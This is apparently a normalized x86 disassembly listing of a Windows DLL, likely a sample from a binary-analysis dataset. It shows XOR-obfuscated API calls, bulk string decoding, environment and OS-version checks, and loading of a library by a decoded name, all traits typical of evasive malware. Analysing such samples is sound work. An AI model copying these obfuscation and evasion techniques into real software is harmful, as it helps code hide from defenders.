mov [ esp + 0x450 ] 0x4
call sub_10051380
lea esi [ esp + 0x1bc ]
mov [ esp + 0x450 ] 0x3
call sub_10051380
lea esi [ esp + 0x2bc ]
mov [ esp + 0x450 ] 0x2
call sub_10051380
lea esi [ esp + 0x3bc ]
mov [ esp + 0x450 ] 0x1
call sub_10051380
sub edi 0xffffff80
cmp edi [ esp + 0x18 ]
jne r-xdata
mov eax [ eax ]
mov ecx edi
call sub_100539f0
lea eax [ esp + 0x3bc ]
push eax
call sub_1000a880
mov ebx eax
lea ecx [ esp + 0x2bc ]
push ecx
mov [ esp + 0x454 ] 0x2
call sub_1000a880
mov [ esp + 0x38 ] eax
lea edx [ esp + 0x1bc ]
push edx
mov [ esp + 0x454 ] 0x3
call sub_1000a880
mov [ esp + 0x28 ] eax
lea eax [ esp + 0xbc ]
push eax
mov [ esp + 0x454 ] 0x4
call sub_1000a880
mov esi eax
lea ecx [ esp + 0x23c ]
push ecx
mov [ esp + 0x454 ] 0x5
call sub_1000a880
mov [ esp + 0x34 ] eax
lea edx [ esp + 0x33c ]
push edx
mov [ esp + 0x454 ] 0x6
call sub_1000a880
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x13c ]
push eax
mov [ esp + 0x454 ] 0x7
call sub_1000a880
mov [ esp + 0x30 ] eax
lea ecx [ esp + 0x3c ]
push ecx
mov [ esp + 0x454 ] 0x8
call sub_1000a880
lea ecx [ esi + 0x58 ]
mov esi 0x8
mov [ esp + 0x450 ] 0x9
cmp [ ecx + 0x14 ] esi
jb r-xdata
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
sub_10033f90
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
sub_10034010
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
call sub_10079170
inc [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x10 ]
mov ecx [ esi ]
sub eax edi
lea edx [ eax * 4 - 0x4 ]
lea ecx [ ecx + edi * 4 ]
push edx
push ecx
add ecx 0x4
push ecx
call sub_1007ec40
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
add esp 0xc
mov [ eax + edi * 4 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10034060
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
mov ecx esi
call sub_1000af00
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edx
lea edx [ ebp - 0x4 ]
push edx
mov ecx esi
call sub_10060ae0
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] ecx
jmp r-xdata
nop
mov ecx eax
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10034100
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
cmp edi 0x7ffffffe
jbe r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10030594
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_10071bf0
test edi edi
je r-xdata
cmp edx 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx eax
jbe r-xdata
mov eax esi
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax [ esi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
push ebx
lea ebx [ edi + edi ]
push ebx
push edx
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
sub eax ecx
push edx
sar eax 0x1
push eax
push esi
mov ecx esi
call sub_1002d970
pop edi
pop esi
pop ebp
retn 0x8
sub_100341f0
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10016802
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10034290
push ebp
mov ebp esp
sub esp 0x1bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ rw-data ]
push 0x11c
lea eax [ ebp - 0x1b8 ]
push 0x0
push eax
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x1b8 ]
push ecx
mov [ ebp - 0x1b8 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1b4 ] 0x5
push esi
mov esi [ StrStrIW@IAT ]
push edi
jne r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xc ]
mov eax 0x1a
call sub_10019570
lea edx [ ebp - 0x54 ]
mov eax 0xe
call sub_10019570
lea edx [ ebp - 0x9c ]
mov eax 0x1c
call sub_10019570
lea edx [ ebp - 0x34 ]
mov eax 0x1b
call sub_10019570
lea edx [ ebp - 0xc ]
push edx
lea edi [ ebx + 0xda0 ]
push edi
call esi
test eax eax
jne r-xdata
cmp [ ebp - 0x1b0 ] 0x1
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x9c ]
push eax
push edi
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x24
call sub_10019570
push edx
lea edi [ ebx + 0xda0 ]
push edi
call esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x34 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x21
call sub_10019570
mov eax edx
push eax
push edi
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x54 ]
push edx
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x29
call sub_10019570
mov ecx edx
push ecx
push edi
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x22
call sub_10019570
lea edx [ ebp - 0x64 ]
mov eax 0x3
call sub_10019570
lea eax [ ebp - 0x78 ]
push eax
push edi
call esi
test eax eax
je r-xdata
call sub_10004880
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x64 ]
push ecx
push edi
call esi
test eax eax
je r-xdata
push 0x0
push 0x1
push r--data
push 0x0
lea edx [ ebp - 0x1bc ]
push edx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1bc ]
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
sub_10034468
push 0x8
push r--data
call sub_1007fad0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1002f3c9
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003450a
push 0xc
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_100567c9
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10034513
call sub_1007fb15
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_10034533
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_10069c53
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_1000a86e
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_1000a86e
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_10034577
push 0x4
mov eax sub_100854f2
call sub_10026266
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1004312b
mov eax esi
call sub_10008d33
retn 0x8
sub_100345b0
push ebp
mov ebp esp
sub esp 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
push esi
xor eax eax
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x18 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0xc ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea edx [ ebp - 0x20 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x20 ] 0x3
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
call [ ebp + 0xc ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_10034680
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x10 ]
lea ecx [ eax + edi ]
cmp ecx [ esi + 0x8 ]
ja r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
push edi
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
push eax
call sub_10011b4a
mov edx [ ebp + 0xc ]
push edx
push eax
call sub_1003a1fc
jmp r-xdata
push ebx
mov ebx 0x1
test edi edi
je r-xdata
add esp 0xc
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop edi
pop esi
pop ebp
retn
mov [ ebp + 0x8 ] edi
nop
sub [ ebp + 0x8 ] ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add [ esi ] eax
add [ esi + 0x1c ] eax
mov edi [ esi ]
cmp ecx 0xa
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
cmp ecx 0x9
jne r-xdata
add [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
jmp r-xdata
add [ esi + 0x18 ] ebx
mov edx [ esi + 0x2c ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
mov eax [ esi + 0x18 ]
xor edx edx
div ecx
add eax ebx
imul eax ecx
mov [ esi + 0x18 ] eax
jmp r-xdata
cmp edi [ esi + 0x8 ]
jae r-xdata
mov [ esi + 0xc ] 0xffffffff
call sub_1007e620
jmp r-xdata
sub_10034740
push 0x0
push 0x82
push 0x4
push 0x0
push 0x1
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
retn
push 0x2
push 0x0
push 0x0
push eax
call [ SetFilePointer@IAT ]
push 0x0
push 0x0
push 0x0
call [ CreateMutexW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push ebx
push esi
call [ lstrlenW@IAT ]
mov ebx eax
add ebx ebx
push esi
call sub_10026520
add esp 0x4
mov [ rw-data ] 0x1
pop ebx
sub_100347b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10089173
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov edi edx
xor ebx ebx
cmp [ edi + 0x14 ] 0x8
mov esi ecx
mov [ esp + 0x10 ] ebx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp dx bx
je r-xdata
mov ecx r--data
mov eax [ esi + 0x39c ]
mov [ esp + 0x10 ] eax
inc eax
push 0xd0
mov [ esi + 0x39c ] eax
call sub_1002e3ac
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0x68 ] 0x1
cmp eax ebx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
call sub_10026420
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
xor edi edi
mov edx [ esp + 0x10 ]
push edi
push edx
push eax
call sub_1005ed30
mov edi eax
jmp r-xdata
mov ecx [ esp + 0x10 ]
lea edi [ esi + 0x3c0 ]
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ebx
call sub_1003ac30
inc [ esi + 0x3d0 ]
jmp r-xdata
lea edx [ esp + 0x38 ]
mov eax 0x134
call sub_10069020
xor ecx ecx
mov eax edx
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] cx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp eax ebx
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
cmp eax [ esi + 0x3a8 ]
jne r-xdata
mov ecx [ esi + 0x3a0 ]
lea edx [ esp + 0x14 ]
cmp ecx edx
ja r-xdata
mov [ esp + 0x68 ] 0xffffffff
mov eax [ esi + 0x3a4 ]
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
cmp ecx eax
jae r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x24 ]
call sub_10034100
lea edx [ esp + 0x1c ]
mov ecx 0x6
mov [ esp + 0x68 ] ebx
call sub_10022b50
cmp [ esp + 0x30 ] 0x8
jb r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov eax [ esi + 0x3a4 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x3a0 ]
call sub_1000c5c0
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x3a8 ]
jne r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_1000a86e
add esp 0x4
jmp r-xdata
add [ esi + 0x3a4 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x3a4 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x3a0 ]
call sub_1000c5c0
mov ecx [ esi + 0x3a0 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_100349d0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x24 ]
mov edx [ edi ]
test edx edx
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp edx ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edx
mov [ edi ] ecx
sub eax ecx
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
pop edi
mov [ ecx ] al
pop esi
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
mov edi edi
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_10007d10
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ ecx ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov ecx [ esi + 0x34 ]
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
jne r-xdata
push ebx
push edx
push edi
call sub_1007f580
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x24 ]
mov ecx edi
sub ecx edx
add [ esi + 0x3c ] ecx
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov eax [ ebp + 0x8 ]
push edx
call sub_1000a86e
add esp 0x4
sub_10034b80
push ebp
mov ebp esp
sub esp 0xed8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x0
push esi
mov esi [ ebp + 0x8 ]
je r-xdata
mov edx [ rw-data ]
push edx
call [ SetUnhandledExceptionFilter@IAT ]
mov eax [ rw-data ]
push eax
call [ SetErrorMode@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_10019274
add esp 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0xc
push sub_100727e0
call [ SetUnhandledExceptionFilter@IAT ]
push 0x8003
mov [ rw-data ] eax
call [ SetErrorMode@IAT ]
mov [ rw-data ] eax
push 0x104
lea eax [ ebp - 0xed8 ]
push eax
push esi
mov [ rw-data ] esi
call [ GetModuleFileNameW@IAT ]
lea ecx [ ebp - 0xed8 ]
push ecx
call [ PathStripPathW@IAT ]
lea edx [ ebp - 0x7b4 ]
mov eax 0x115
call sub_10069020
push edx
lea eax [ ebp - 0xed8 ]
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
push eax
call [ FreeLibrary@IAT ]
lea ecx [ ebp - 0x7b4 ]
push ecx
call [ LoadLibraryW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push edi
push 0x6720
mov [ rw-data ] esi
call sub_1002b2d3
mov esi eax
add esp 0x4
lea edi [ ebp - 0x2f8 ]
mov eax 0x9d
mov [ rw-data ] esi
call sub_1000ce20
lea edi [ ebp - 0x9d4 ]
mov eax 0x1a
call sub_1000ce20
lea edi [ ebp - 0x10c ]
mov eax 0xb5
call sub_1000ce20
lea edi [ ebp - 0x170 ]
mov eax 0x85
call sub_1000ce20
lea edi [ ebp - 0x658 ]
mov eax 0x109
call sub_1000ce20
lea edi [ ebp - 0x13c ]
mov eax 0xdd
call sub_1000ce20
lea edi [ ebp - 0x7d8 ]
mov eax 0x136
call sub_1000ce20
lea edi [ ebp - 0xaec ]
mov eax 0x78
call sub_1000ce20
lea edi [ ebp - 0x34c ]
mov eax 0x159
call sub_1000ce20
lea edi [ ebp - 0x26c ]
mov eax 0xe8
call sub_1000ce20
lea edi [ ebp - 0x3bc ]
mov eax 0x21
call sub_1000ce20
lea edi [ ebp - 0x8f8 ]
mov eax 0x9
call sub_1000ce20
lea edi [ ebp - 0x820 ]
mov eax 0x6f
call sub_1000ce20
lea edi [ ebp - 0x8b0 ]
mov eax 0x155
call sub_1000ce20
lea edi [ ebp - 0x598 ]
mov eax 0x13f
call sub_1000ce20
lea edi [ ebp - 0xc ]
mov eax 0x88
call sub_1000ce20
lea edi [ ebp - 0xdc ]
mov eax 0x13e
call sub_1000ce20
lea edi [ ebp - 0x1c4 ]
mov eax 0xd4
call sub_1000ce20
lea edi [ ebp - 0xc38 ]
mov eax 0x10
call sub_1000ce20
lea edi [ ebp - 0xc0c ]
mov eax 0x14b
call sub_1000ce20
lea edi [ ebp - 0x384 ]
mov eax 0xcd
call sub_1000ce20
lea edi [ ebp - 0x2c0 ]
mov eax 0x12
call sub_1000ce20
lea edi [ ebp - 0x6e4 ]
mov eax 0x31
call sub_1000ce20
lea edi [ ebp - 0x330 ]
mov eax 0xba
call sub_1000ce20
lea edi [ ebp - 0xb8c ]
mov eax 0xb1
call sub_1000ce20
lea edi [ ebp - 0x438 ]
mov eax 0x8c
call sub_1000ce20
lea edi [ ebp - 0x368 ]
mov eax 0xbd
call sub_1000ce20
lea edi [ ebp - 0x18c ]
mov eax 0x12c
call sub_1000ce20
lea edi [ ebp - 0x964 ]
mov eax 0xf6
call sub_1000ce20
lea edi [ ebp - 0x3f8 ]
mov eax 0x132
call sub_1000ce20
lea edi [ ebp - 0xac4 ]
mov eax 0x100
call sub_1000ce20
lea edi [ ebp - 0xa74 ]
mov eax 0x3b
call sub_1000ce20
lea edi [ ebp - 0x4b8 ]
mov eax 0xae
call sub_1000ce20
lea edi [ ebp - 0x5b8 ]
mov eax 0x8a
call sub_1000ce20
lea edi [ ebp - 0x478 ]
mov eax 0xfe
call sub_1000ce20
lea edi [ ebp - 0x4f8 ]
mov eax 0x101
call sub_1000ce20
lea edi [ ebp - 0x1a8 ]
mov eax 0xcb
call sub_1000ce20
lea edi [ ebp - 0x69c ]
mov eax 0x5a
call sub_1000ce20
lea edi [ ebp - 0xc4 ]
mov eax 0x14
call sub_1000ce20
lea edi [ ebp - 0xbb4 ]
mov eax 0x145
call sub_1000ce20
lea edi [ ebp - 0x868 ]
mov eax 0xb6
call sub_1000ce20
lea edi [ ebp - 0x4c ]
mov eax 0x92
call sub_1000ce20
lea edi [ ebp - 0x418 ]
mov eax 0x3d
call sub_1000ce20
lea edi [ ebp - 0x618 ]
mov eax 0xab
call sub_1000ce20
lea edi [ ebp - 0x7fc ]
mov eax 0x14c
call sub_1000ce20
lea edi [ ebp - 0xbe0 ]
mov eax 0x1f
call sub_1000ce20
lea edi [ ebp - 0xb14 ]
mov eax 0x8
call sub_1000ce20
lea edi [ ebp - 0x940 ]
mov eax 0x4e
call sub_1000ce20
lea edi [ ebp - 0xb3c ]
mov eax 0x127
call sub_1000ce20
lea edi [ ebp - 0x458 ]
mov eax 0x152
call sub_1000ce20
lea edi [ ebp - 0x798 ]
mov eax 0x3c
call sub_1000ce20
lea edi [ ebp - 0x94 ]
mov eax 0x7
call sub_1000ce20
lea edi [ ebp - 0x498 ]
mov eax 0xd2
call sub_1000ce20
lea edi [ ebp - 0x34 ]
mov eax 0x1e
call sub_1000ce20
lea edi [ ebp - 0xa24 ]
mov eax 0x43
call sub_1000ce20
lea edi [ ebp - 0x250 ]
mov eax 0xed
call sub_1000ce20
lea edi [ ebp - 0x6c0 ]
mov eax 0xc2
call sub_1000ce20
lea edi [ ebp - 0x750 ]
mov eax 0xef
call sub_1000ce20
